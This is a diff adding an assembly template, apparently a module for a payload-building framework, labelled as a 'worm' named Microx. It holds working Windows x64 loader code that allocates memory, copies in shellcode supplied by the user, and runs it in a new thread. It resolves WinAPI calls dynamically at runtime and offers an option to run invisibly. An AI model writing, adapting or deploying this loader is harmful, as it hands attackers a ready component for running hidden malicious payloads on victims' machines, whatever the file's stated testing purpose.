@@ -1,0 +1,97 @@
+#!name##Microx
+#!itemType##worm
+#!info##A simple self-injector written in assembly, suitable for testing shellcode. When executed, it injects the shellcode into itself and runs it. WinAPI functions are imported from its own internal library and are resolved dynamically at runtime.
+#!lang##nasm
+#!wormCompiler##Basic-Nasm
+#!Wprocess##BasicProc
+#!reqMod##DuckTalesLib2
+#!payloadSpace##MIX_scode##Your shellcode
+#!Var##EXEC_SHOW##gui##Determines whether the executable file will run in the console or will be invisible as a 'gui'. Acctepted: 'console' or 'gui'##str
+
+{% if EXEC_SHOW == "gui" %}
+    {% set MICROX_ENTRY_POINT = "WinMain" %}
+{% else %}
+    {% set MICROX_ENTRY_POINT = "main" %}
+{% endif %}
+
+
+bits 64
+default rel
+
+extern DuckStartTales
+extern exeVirtualAlloc
+extern exeCreateThread
+extern exeRtlMoveMemory
+extern addrWaitForSingleObject
+
+extern ExitProcess
+
+section .data
+    shellcode: db {{scTOOL.PutShellcode(MIX_scode)}}
+    sc_len: equ $-shellcode
+
+section .bss
+    mem_addr: resq 1    ; memory address
+    th_handle: resq 1   ; thread handle
+
+section .text
+    global {{MICROX_ENTRY_POINT}}
+
+{{MICROX_ENTRY_POINT}}:
+    sub rsp, 40
+    call DuckStartTales
+    call SelfInject
+    add rsp, 8
+    
+    ; get function address
+    call addrWaitForSingleObject
+    
+    lea rcx, [th_handle]
+    mov rcx, [rcx]
+    mov edx, -1
+    call rax
+    
+    call ExitProgram
+
+SelfInject:
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    ; Allocate Memory
+    mov rcx, 0
+    mov rdx, sc_len
+    call exeVirtualAlloc
+    
+    ; Save Memory Address
+    lea rcx, [mem_addr]
+    mov qword [rcx], rax    ; save memory address
+    
+    ; Move shellcode to target address
+    mov rcx, rax
+    lea rdx, [shellcode]
+    mov r8, sc_len
+    call exeRtlMoveMemory
+    
+    ; Create and execute Thread
+    lea rcx, [mem_addr]
+    mov rcx, [rcx]
+    mov rdx, 0
+    call exeCreateThread
+    
+    ; Save Thread handle
+    lea rcx, [th_handle]
+    mov [rcx], rax
+
+    
+    add rsp, 32
+    
+    pop rbp
+    ret
+    
+
+
+ExitProgram:
+    sub rsp, 32
+    mov rcx, 0
+    call ExitProcess
